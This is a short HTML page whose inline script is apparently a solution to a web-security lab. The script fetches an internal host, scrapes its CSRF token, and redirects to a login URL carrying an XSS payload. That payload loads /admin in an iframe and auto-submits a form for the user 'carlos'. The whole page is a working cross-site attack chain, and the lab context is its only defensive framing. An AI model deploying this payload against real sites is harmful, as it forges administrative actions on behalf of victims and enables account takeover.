<html>
	<script>
		url=' http://exploit-0a7700e40471bfcc80bdbb22012c0051.exploit-server.net/'
		urlFound='http://192.168.0.195:8080'
		
        fetch(urlFound).then(response => response.text()).then(text =>{ 
				try {
                    xss_vector='"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">';
                    login_path= '/login?username=' + encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
                    location = urlFound + login_path;
				}
				catch(err)
				{
				}		
			})
	
	</script>
</html>